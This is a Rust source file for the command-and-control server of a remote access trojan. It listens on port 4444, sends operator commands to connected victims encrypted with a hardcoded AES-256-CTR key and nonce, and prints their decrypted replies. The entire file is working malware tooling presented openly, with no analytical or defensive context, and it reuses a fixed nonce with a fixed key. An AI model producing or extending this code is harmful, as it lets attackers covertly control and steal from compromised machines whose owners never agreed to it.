
use std::convert::TryInto;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::thread;
use aes::Aes256;
use ctr::cipher::{NewCipher, StreamCipher};
use aes::cipher::generic_array::GenericArray;

const AES_KEY: &[u8; 32] = b"Wb2tGLsatZ6G6JzebGGX6Lh9h0Tb3J6e";
const AES_NONCE: &[u8; 16] = b"vgAipgklkPdpNjMK";
const MESSAGE_END: &str = "<END>";

fn main() {
    let listener = TcpListener::bind("0.0.0.0:4444").expect("Could not bind");
    println!("Listening on port 4444");
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("New connection: {}", stream.peer_addr().unwrap());
                thread::spawn(move || handle_client(stream));
            }
            Err(e) => println!("Connection failed: {}", e),
        }
    }
}

fn handle_client(mut stream: TcpStream) {
    let stream_clone = stream.try_clone().expect("Failed to clone the stream");

    let handle_input = thread::spawn(move || {
        let mut input_stream = stream_clone;
        loop {
            let mut command = String::new();
            std::io::stdin().read_line(&mut command).unwrap();
            let command = command.trim().to_string() + MESSAGE_END;

            let encrypted_command = encrypt(&command).unwrap();

            // Handle length prefix
            let mut length_prefix = (encrypted_command.len() as u32).to_be_bytes().to_vec();
            length_prefix.extend(encrypted_command);

            if input_stream.write_all(&length_prefix).is_ok() {
                input_stream.flush().unwrap();
            } else {
                println!("Failed to send command: {}", command);
            }

            if command.starts_with("!!kill") {
                break;
            }
        }
    });

    let mut buffer = [0; 1024];
    let mut encrypted_data = Vec::new();
    let mut decrypted_data = Vec::new();
    let mut message_length = None;

    loop {
        match stream.read(&mut buffer) {
            Ok(size) => {
                if size > 0 {
                    encrypted_data.extend_from_slice(&buffer[..size]);

                    while encrypted_data.len() >= 4 && message_length.is_none() {
                        if let Ok(length_bytes) = encrypted_data[..4].try_into() {
                            message_length = Some(u32::from_be_bytes(length_bytes) as usize);
                            encrypted_data.drain(..4); // Remove length prefix
                        } else {
                            return;
                        }
                    }

                    if let Some(length) = message_length {
                        if encrypted_data.len() >= length {
                            let encrypted_message = encrypted_data.drain(..length).collect::<Vec<_>>();
                            match decrypt(&encrypted_message) {
                                Ok(mut decrypted_chunk) => {
                                    decrypted_data.append(&mut decrypted_chunk);

                                    while let Some(pos) = find_message_end(&decrypted_data) {
                                        let message = decrypted_data.drain(..pos + MESSAGE_END.len()).collect::<Vec<_>>();
                                        match String::from_utf8(message[..message.len() - MESSAGE_END.len()].to_vec()) {
                                            Ok(response) => {
                                                print!("{}", response);
                                                if response.contains("Terminating RAT") {
                                                    break;
                                                }
                                            }
                                            Err(_) => {},
                                        }
                                    }
                                }
                                Err(_) => {},
                            }
                            message_length = None;
                        }
                    }
                }
            }
            Err(_) => {
                break;
            },
        }
    }

    handle_input.join().unwrap();
}

fn find_message_end(data: &[u8]) -> Option<usize> {
    let end_marker = MESSAGE_END.as_bytes();
    data.windows(end_marker.len()).position(|window| window == end_marker)
}

fn encrypt(data: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let key = GenericArray::from_slice(AES_KEY);
    let nonce = GenericArray::from_slice(AES_NONCE);
    let mut cipher = ctr::Ctr128BE::<Aes256>::new(&key, &nonce);
    let mut buffer = data.as_bytes().to_vec();
    cipher.apply_keystream(&mut buffer);
    Ok(buffer)
}

// Unified with the RAT decrypt function
fn decrypt(data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let key = GenericArray::from_slice(AES_KEY);
    let nonce = GenericArray::from_slice(AES_NONCE);
    let mut cipher = ctr::Ctr128BE::<Aes256>::new(&key, &nonce);
    let mut buffer = data.to_vec();
    cipher.apply_keystream(&mut buffer);
    Ok(buffer)
}
